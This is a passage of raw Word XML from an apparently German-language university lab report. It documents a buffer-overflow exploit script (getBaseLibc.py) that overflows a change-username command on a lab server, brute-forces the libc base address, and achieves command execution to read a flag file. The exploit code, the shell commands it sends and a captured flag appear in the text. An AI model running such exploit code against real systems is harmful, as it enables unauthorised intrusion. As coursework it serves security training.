            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    IP_FH = '10.105.21.174'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BA98C30" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    IP_MARTIN = '10.0.2.22'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0273BA06" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    IP = IP_FH</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CB42E94" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    PORT = 8080</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="176BB8AA" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    BUFFER_SIZE = 2048</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A981486" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="57580616" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # connection establishment+</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66EE56AD" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60801F22" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    connect = s.connect((IP, PORT))  # hardcoded IP address</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E3757F5" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1C362E78" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # login to the application</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65A16A9D" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(login)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C83EBA3" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    res2 = s.recv(BUFFER_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BF3CDEA" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="032F7409" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    time.sleep(0.02)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E8331A5" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1A145F83" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # sending buffer to change username vulnerability</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AA0E388" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send('u ' + buffer + '\n')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2945A210" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    res3 = s.recv(BUFFER_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F67087E" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5EBDAAF4" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # echo something with bin/sh</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D54431C" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send('echo martingratt' + '\n')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="149F554D" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    res4 = s.recv(BUFFER_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F98336E" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4CF9CF3D" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    if ("martingratt" in res4):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26902D8E" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print "SUCCESSFULL"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="043064A0" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print "------------------------"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F90FEE7" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print "echo martingratt successfully executed with libc base address " + hex(libcBase)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="088FC747" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print "------------------------"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EDC9CBA" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        response = 'true'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40754C4F" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    else:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EFD4A23" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print "FAILED"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06121FF2" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print "------------------------"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00604AE1" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print "Failed to echo martingratt with libc base address " + hex(libcBase)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0925438D" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print "------------------------" + "\n"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="759D3955" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="2BAD7A8A" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    libcBase = libcBase + 0x00001000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27D41EFF" w14:textId="3942D6D3" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.close()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00116B42" w:rsidRPr="00B47CB9" w14:paraId="6C173890" w14:textId="77777777" w:rsidTr="00116B42">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4D3457C0" w14:textId="33DBC4D2" w:rsidR="00116B42" w:rsidRPr="00B47CB9" w:rsidRDefault="00116B42" w:rsidP="001E62D2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>getBaseLibc.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0E7F899F" w14:textId="7723E557" w:rsidR="00F24D70" w:rsidRPr="00B47CB9" w:rsidRDefault="00F24D70" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37222A1A" w14:textId="77777777" w:rsidR="00F24D70" w:rsidRPr="00B47CB9" w:rsidRDefault="00F24D70">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D268C71" w14:textId="356825AA" w:rsidR="00FC7098" w:rsidRPr="00B47CB9" w:rsidRDefault="00961B47" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Das erstellte </w:t>
      </w:r>
      <w:r w:rsidR="00FC7098" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Skript gab auf der Konsole folgendes aus (siehe Abbildung):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="705B1E33" w14:textId="72A272AD" w:rsidR="00FC7098" w:rsidRPr="00B47CB9" w:rsidRDefault="00FC7098" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D164344" w14:textId="1DC34FA0" w:rsidR="00FC7098" w:rsidRPr="00B47CB9" w:rsidRDefault="00FC7098" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="54522DE5" wp14:editId="692AE631">
            <wp:extent cx="4353636" cy="2580215"/>
            <wp:effectExtent l="0" t="0" r="8890" b="0"/>
            <wp:docPr id="115" name="Grafik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408124" cy="2612508"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D27FC5" w14:textId="6E93FBCB" w:rsidR="00FC7098" w:rsidRPr="00B47CB9" w:rsidRDefault="00FC7098" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E2F9E8C" w14:textId="0C29CD42" w:rsidR="00FC7098" w:rsidRPr="00B47CB9" w:rsidRDefault="004A7138" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Mithilfe des Skripts</w:t>
      </w:r>
      <w:r w:rsidR="007444B0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> konnte also ermittelt werden, dass die Base Adresse von LibC </w:t>
      </w:r>
      <w:r w:rsidR="003133E3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>0xb75b3000 sein muss. Diese Information wurde verwendet, um den schlussendlichen</w:t>
      </w:r>
      <w:r w:rsidR="00E14F75" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Proof of concept zu entwickeln. Die Schleife wurde entfernt und der Variable libcBase der Wert 0xb75b3000 zugewiesen. </w:t>
      </w:r>
      <w:r w:rsidR="00D944DD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Statt „echo martingratt“ wurde </w:t>
      </w:r>
      <w:r w:rsidR="00AA7996" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>zuerst „ls -l“ übertragen</w:t>
      </w:r>
      <w:r w:rsidR="006811DD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>, in der Abbildung ist der Response ersichtlich:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F317BBD" w14:textId="6864D31B" w:rsidR="006811DD" w:rsidRPr="00B47CB9" w:rsidRDefault="006811DD" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F039DA7" w14:textId="631CCD15" w:rsidR="006811DD" w:rsidRPr="00B47CB9" w:rsidRDefault="006811DD" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="62F48E92" wp14:editId="25E45E7F">
            <wp:extent cx="4448584" cy="1525369"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="116" name="Grafik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487442" cy="1538693"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="49DEB9DB" w14:textId="008CEE1D" w:rsidR="00AA7996" w:rsidRPr="00B47CB9" w:rsidRDefault="00AA7996" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39978310" w14:textId="35401706" w:rsidR="00AA7996" w:rsidRPr="00B47CB9" w:rsidRDefault="006811DD" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">So konnte bestimmt werden, dass </w:t>
      </w:r>
      <w:r w:rsidR="00990B5C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>meine Flag cs19m050_flag.txt sein musst. Daher endete ich das auszuführende Kommando auf „cat cs19m050_flag.txt“, damit der Inhalt der Datei ausge</w:t>
      </w:r>
      <w:r w:rsidR="009C2AE9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>geben wird und bekam folgende Antwort</w:t>
      </w:r>
      <w:r w:rsidR="00CC7E7C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C002F7" w14:textId="0A0B056D" w:rsidR="00CC7E7C" w:rsidRPr="00B47CB9" w:rsidRDefault="00CC7E7C" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1533717E" w14:textId="0C4F627D" w:rsidR="001076DB" w:rsidRPr="00B47CB9" w:rsidRDefault="00CC7E7C" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5C81FA93" wp14:editId="7147422E">
            <wp:extent cx="5759450" cy="279400"/>
            <wp:effectExtent l="0" t="0" r="0" b="6350"/>
            <wp:docPr id="119" name="Grafik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759450" cy="279400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BDAB97" w14:textId="74ED3C6C" w:rsidR="00F24D70" w:rsidRPr="00B47CB9" w:rsidRDefault="00F24D70">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA25AD7" w14:textId="1DEEBB3B" w:rsidR="00CC7E7C" w:rsidRPr="00B47CB9" w:rsidRDefault="00CC7E7C">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Der Inhalt der Flag ist also folgender:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A918E83" w14:textId="77777777" w:rsidR="00CC7E7C" w:rsidRPr="00B47CB9" w:rsidRDefault="00CC7E7C">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B0E9EA9" w14:textId="7B944C2E" w:rsidR="002B1549" w:rsidRPr="00B47CB9" w:rsidRDefault="00411DEE" w:rsidP="00F43D22">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>?]-z#L,UI'Erbh4qx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033B86D6" w14:textId="77777777" w:rsidR="00411DEE" w:rsidRPr="00B47CB9" w:rsidRDefault="00411DEE" w:rsidP="00411DEE">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DF95C2D" w14:textId="755DE20D" w:rsidR="00354FB2" w:rsidRDefault="0099239C" w:rsidP="002B1549">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ich konnte innerhalb des Abgabeslots keinen </w:t>
      </w:r>
      <w:r w:rsidR="00646FF4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Bereich finden, wo man das Token abgeben hätte können. Daher gehe ich davon aus, dass es innerhalb der Dokumentation ausreicht.</w:t>
      </w:r>
    </w:p>
